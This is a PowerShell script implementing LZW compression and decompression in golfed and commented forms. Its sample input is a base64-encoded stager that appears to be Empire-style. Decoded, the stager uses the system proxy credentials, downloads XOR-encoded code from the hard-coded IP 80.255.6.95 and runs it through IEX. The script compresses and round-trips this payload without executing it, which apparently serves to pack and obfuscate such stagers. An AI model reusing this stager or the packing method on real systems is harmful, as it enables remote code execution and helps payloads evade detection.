<# 
DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE 
                    Version 2, December 2004 
Copyright (C) 2004 Sam Hocevar <sam@hocevar.net> 
Everyone is permitted to copy and distribute verbatim or modified 
copies of this license document, and changing it is allowed as long 
as the name is changed. 
           DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE 
 TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION 

0. You just DO WHAT THE FUCK YOU WANT TO.

         ///\\\  ( Have Fun )
        ( ^  ^ ) /
      __(  __  )__
     / _ `----' _ \
     \__\   _   |__\
      (..) _| _ (..)
       |____(___|     Mynameisv_ 2016
_ __ _ (____)____) _ _________________________________ _'
#> 

################################################################
## Short versions
################################
# Math Shortcut
$m_=[math];
# Shorted Bit-Shift
function bs{param($v,$s)return $m_::Floor($v*$m_::Pow(2,-$s))}
# Decompression and Bits-Read
function br{param($o,$c,$a)$p=0;$j=$m_::floor(($t=$a.value)*$c/8);$s=($r=8-(($t*$c)%8))-$c;$b=$m_::Pow(2,$c)-1;$i=0;$e=0;while($e-lt$c){$p=$p-bor((bs $o[$j+$i] $s)-band$b);$e+=$r;if(($r+=$c)-gt8){$r=8}$s=8+$s;$i++}$a.value++;return $p}
function lzwd{param($p)$a=($j=0);$v=@();$e=($o='');$c=$p[0];$p=$p[1..$p.length];foreach($i in 0..255){$v+=[string]([char]$i)}$o+=($w=[string]$v[($j=br $p $c ([ref]$a))]);while([math]::floor($a*$c/8)-lt($p.length-1)){$l=$v.count;if(($j=br $p $c ([ref]$a))-lt$l){$o+=$v[$j];$e=[string]$v[$j]}elseif($j-eq$l){$o+=$v[$j];$e=$w+$w[0]}else{write-host ""}$v+=$w+$e[0];$w=$e}return $o;}
# Compression and Bits-Write
function bw{param($v,$c,$a,$o)$s=$c-($w=8-(($a.value*$c-8)%8));$r=0;while($r-lt$c){$p=(bs $v $s)-band0xff;if($w-eq8){$o.value+=$p}elseif($r-eq0){$o.value[$i]=$o.value[($i=$o.value.count-1)]-bor$p}else{$o.value+=$p}$w=8-($r=$c-$s);$s-=8}$a.value++}
function lzwc{param($o,$c)$a=0;$p=($y=@());$v=($w='');foreach($i in 0..255){$y+=[string][char]$i;}$x=$m_::Pow(2,$c)-1;for($i=0;$i-le$o.length;$i++){if([array]::IndexOf($y,($w=$v+$o[$i]))-gt-1){$v=$w}else{bw ([array]::IndexOf($y,$v)) $c ([ref]$a) ([ref]$p);if($y.length-ge$x){$v=[string]$o[$i];}else{$y+=$w;$v=[string]$o[$i]}}}bw ([array]::IndexOf($y,$v)) $c ([ref]$a) ([ref]$p);return @($c)+$p;}
################################################################
## Long versions
################################
# Shift bits left or right
function Bits-Shift{
	param(
		[int32]$iValue, # integer valuer to shift
		[int32]$iShift # number of bit to shif : >0 means to the right, <0 means to the left
	)
	return [math]::Floor($iValue*[math]::Pow(2,-$iShift));
}
################################
# Write n-bits in a byte array
function Bits-Write{
	param(
		[int32]$iValue,	# Value to encode and write
		[int32]$iCodingSize, # Size in bits of the coding (9 to 15 bits)
		[ref]$iBytesCount, # Written bytes counter, as a reference
		[ref]$aBytes	# array of encoded/written bits, as a reference
	)
	# Number of bits to write in the first loop
	$iBitsToWrite = 8 - (($iBytesCount.value * $iCodingSize - 8)%8);
	
	# First shift
	$iShift = $iCodingSize - $iBitsToWrite;
	
	# Number of bits that have been written
	$iWrittenBits = 0;

	# Loop until we have written $iCodingSize bits
	while($iWrittenBits -lt $iCodingSize){
		# Build output  
		$bOutput = Bits-Shift -iValue $iValue -iShift $iShift;
		
		# clean left part to keep
		$bOutput = $bOutput -band 0x000000ff;
		
		if($iBitsToWrite -eq 8){
			# 8 bits to write, Write output as a new Byte output
			$aBytes.value += $bOutput;
		} elseif($iWrittenBits -eq 0){
			# Last bits to write, add it to the actual Byte ouput
			$iCurrentBytePos = $aBytes.value.count - 1;
			# Write as an OR
			$aBytes.value[$iCurrentBytePos] = $aBytes.value[$iCurrentBytePos] -bor $bOutput;
		}else{
			# n-bits to write, Write output as a new Byte output
			$aBytes.value += $bOutput;
		}
		# Written bits
		$iWrittenBits = $iCodingSize - $iShift
		# Remaining bits to write
		$iBitsToWrite = 8 - $iWrittenBits;
		# New shift, simple calcul
		$iShift -= 8;
	}
	# Increment the written bytes counter
	$iBytesCount.value = $iBytesCount.value + 1;
}
################################
# Read n-bits in a byte array
function Bits-Read{
	param(
			[array]$aBytes, # 
			[int32]$iCodingSize, # Size in bits of the encoded content
			[ref]$iBytesCount # Encoded byte read counter
	)
	# The result / output
	$iOutput = [int32]0;
	
	# Current Byte, the n-bits-Element number $iBytesCount, starts at $aBytes[$iReadPos]
	$iReadPos = [math]::floor($iBytesCount.value*$iCodingSize/8);
		
	# Number of bits to read in the current Byte (1 to 8)
	$iBitsToRead = 8-(($iBytesCount.value * $iCodingSize)%8);
	
	# First shift for reading
	$iShift = $iBitsToRead - $iCodingSize;
	
	# Binary mask to clean read value
	$iBinaryMask = [math]::Pow(2,$iCodingSize)-1;
		
	# Next element starts at $aBytes[$iReadPos + $iIndexComplement]
	$iIndexComplement = 0;
	
	# Number of bits that have been read
	$iReadBits = 0;
	
	
	# Loop until we have read $iCodingSize bits
	while ($iReadBits -lt $iCodingSize){
		# Read bits with a shift to remove unwanted bits
		$iBits = Bits-Shift -iValue $aBytes[$iReadPos + $iIndexComplement] -iShift $iShift;

		# clean left part to keep
		$iBits = $iBits -band $iBinaryMask;

		# read (merge) the content to the output
		$iOutput = $iOutput -bor $iBits;
		
		# increase the read bis counter
		$iReadBits += $iBitsToRead;
		
		# calculate the number of bits left to read
		$iBitsToRead = $iCodingSize - $iBitsToRead;
		if ($iBitsToRead -gt 8){
			$iBitsToRead = 8;
		}
		# new shift, simply "8 + last shift"
		$iShift = 8 + $iShift;
		$iIndexComplement +=1;
		
	}
	# Increment the read bytes counter
	$iBytesCount.value = $iBytesCount.value + 1;
	return $iOutput;
}
################################
# LZW Compression
function LZWCompress{
	param(
		$sContent, # Message to encode, as a string
		[int]$iCodingSize # Coding size in bits (9 to 15)
	)
	$iBytesCount = [int32]0; # Number of Bytes written, to calculate the position of the next Byte to write
	$bCompressed = @(); # Output result as an array of Bytes (positions in the dictionnary). First byte is the encoding size and has to be extract before decompression -> $bToUse = $bCompressed[1..$bCompressed.length];
	$aDictionnary=@();	# ephemeral local dictionnary used only during the compression
	$sWordPrevious = '';
	$sWordNext = '';
	
	# Build of the ephemeral local dictionnary
	foreach($i in 0..255){
		# Double conversion [int] -> [char] -> [string]
		# Long version=([string]([char]$i)), short=[string][char]$i;
		$aDictionnary += [string][char]$i;
	}

	# Max size for the dictionarry : 2^$iCodingSize-1
	$iDictionnaryMaxSize = [math]::Pow(2,$iCodingSize)-1;

	# LZW loop
	for ($i=0;$i -le $sContent.length; $i++){
		# Concat previous word ($sWordPrevious) and next element ($sContent[$i]) in $sWordNext
		# $sWordPrevious contains:
		#  - previous char ($sContent[$i-1]) (empty at first loop)
		#  or
		#  - string ($sContent[$i-n]+...+$sContent[$i-1])
		#write-host "sContent[$i]=" $sContent[$i] "  type=" $sContent[$i].gettype() "  full=" $sContent[$i].gettype().fullname;
		$sWordNext = $sWordPrevious + $sContent[$i];

		if ([array]::IndexOf($aDictionnary,$sWordNext) -gt -1){
			# $sWordNext has been found in the dictionnary
			# So we extend the next $sWordNext by setting $sWordPrevious as $sWordNext (will be concated next loop)
			$sWordPrevious = $sWordNext;
		} else {
			# $sWordNext has NOT been found in dictionnary
			# Write previous word ($sWordPrevious) top the output (bit per bit way)
			Bits-Write ([array]::IndexOf($aDictionnary,$sWordPrevious)) $iCodingSize ([ref]$iBytesCount) ([ref]$bCompressed);

			
			if ($aDictionnary.length -ge $iDictionnaryMaxSize){
				# No more free space in the dictionnary
				$sWordPrevious = [string]$sContent[$i];
			} else {
				# Add $sWordNext to the dictionnay
				$aDictionnary+= $sWordNext;
				# Use the current element ($sContent[$i]) as the new previous word
				$sWordPrevious = [string]$sContent[$i];
			}
		}
	}
	# Store last word and avoid miss
	Bits-Write ([array]::IndexOf($aDictionnary,$sWordPrevious)) $iCodingSize ([ref]$iBytesCount) ([ref]$bCompressed);

	return @($iCodingSize)+$bCompressed;
}






################################
# LZW Decompression
function LZWDecompress{
	param(
		$aCompressed # Compressed array of bytes
	)
	$iBytesCount = [int32]0; # Result counter, to count and remember the number of call to Bit-Write
	$aDictionnary=@();	# ephemeral local dictionnary used during the decompression
	$iRef = '';
	$sDicEntry = '';
	$sDecompressed = '';
	$iCodingSize = $aCompressed[0]; # Extract coding size in bits (9 to 15)
	$aCompressed = $aCompressed[1..$aCompressed.length];
	
	# Build of the ephemeral dictionnary
	foreach($i in 0..255){
		$aDictionnary += [string]([char]$i);
	}
	
	$iRef = br $aCompressed $iCodingSize ([ref]$iBytesCount);
	$sWord = [string]$aDictionnary[$iRef];
	$sDecompressed+=$sWord;

	while ([math]::floor($iBytesCount*$iCodingSize/8) -lt ($aCompressed.length-1)){

		$iRef = br $aCompressed $iCodingSize ([ref]$iBytesCount);

		# Is reference in dictionnary ?
		$iDicLen = $aDictionnary.count;
		if ($iRef -lt $iDicLen){
			$sDecompressed+=$aDictionnary[$iRef]
			$sDicEntry = [string]$aDictionnary[$iRef];
		} elseif ($iRef -eq $iDicLen){

			$sDecompressed+=$aDictionnary[$iRef]
			$sDicEntry = $sWord + $sWord[0];
			
		} else {
			write-host "bad compression !!?"
		}

		$aDictionnary+= $sWord+$sDicEntry[0];

		$sWord = $sDicEntry

	}
	return $sDecompressed;
}


$msg = "JAB3AGMAPQBOAEUAdwAtAE8AQgBKAEUAYwB0ACAAUwBZAFMAVABFAG0ALgBOAEUAVAAuAFcARQBCAEMATABJAEUATgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAVwBjAC4ASABlAEEAZABFAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5ACAAPQAgAFsAUwB5AHMAVABFAE0ALgBOAEUAdAAuAFcAZQBCAFIAZQBRAHUAZQBzAHQAXQA6ADoARABFAGYAQQB1AEwAVABXAEUAQgBQAHIAbwB4AFkAOwAkAFcAYwAuAFAAUgBPAFgAWQAuAEMAcgBFAGQAZQBuAHQAaQBhAEwAcwAgAD0AIABbAFMAWQBTAHQAZQBtAC4ATgBlAFQALgBDAHIARQBEAEUATgBUAEkAYQBMAEMAYQBjAGgAZQBdADoAOgBEAEUARgBBAFUAbAB0AE4ARQB0AFcATwByAEsAQwByAGUAZABlAG4AdABJAEEAbABzADsAJABLAD0AJwArACQAaABMACgAfABnAFUAPwBBAGUAXQAqAH0AbgBxAEcAdAAsAGYAagA9ACYAOQA7AGIAdwB5AFEAdgAtADEAJwA7ACQASQA9ADAAOwBbAEMASABBAFIAWwBdAF0AJABiAD0AKABbAEMASABBAFIAWwBdAF0AKAAkAFcAYwAuAEQAbwBXAG4AbABPAGEAZABTAFQAUgBpAG4ARwAoACIAaAB0AHQAcAA6AC8ALwA4ADAALgAyADUANQAuADYALgA5ADUAOgA4ADAALwBpAG4AZABlAHgALgBhAHMAcAAiACkAKQApAHwAJQB7ACQAXwAtAGIAWABPAHIAJABLAFsAJABpACsAKwAlACQASwAuAEwARQBOAGcAVABoAF0AfQA7AEkARQBYACAAKAAkAEIALQBqAE8ASQBuACcAJwApAA==";

$iCodingSize = 11;

$msg = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($msg));
#$msg = [Convert]::FromBase64String($msg);

write-host "Encoding         =" $iCodingSize "bits";
write-host "Dictionnary Size =" ([math]::Pow(2,$iCodingSize)-1);
write-host "Origin        [Len:"$msg.length"]{" $msg.Substring(0,16) "..." $msg.Substring($msg.length-16,16) "}";
#write-host $msg.gettype().fullname;
# $msg.Substring(0,16) "..." $msg.Substring($msg.length-16,16) "}";
$aCompressed = LZWCompress -sContent $msg -iCodingSize $iCodingSize;
$sShow = '';
for ($i=0;$i -lt 8;$i++){$sShow+=[string]$aCompressed[$i]+" ";}
$sShow+="...";
for ($i=$aCompressed.length-8;$i -lt $aCompressed.length;$i++){$sShow+= [string]$aCompressed[$i] + " ";}
write-host "Compressed    [Len:"$aCompressed.length"]{" $sShow"}";
$sB64 = [convert]::ToBase64String($aCompressed);
write-host "Base64(Comp)  [Len:"$sB64.length"]{" $sB64.Substring(0,16) "..." $sB64.Substring($sB64.length-16,16) "}";
$oFromB64 = [Convert]::FromBase64String($sB64);
write-host "FromBase64    [Len:"$oFromB64.length"]{ ... }";
$aBytes=@();
foreach($c in $oFromB64[0..$oFromB64.length]){$aBytes+=[int]$c;}
$sFinal = LZWDecompress $aBytes;
write-host "Origin        [Len:"$sFinal.length"]{" $sFinal.Substring(0,16) "..." $sFinal.Substring($sFinal.length-16,16) "}";

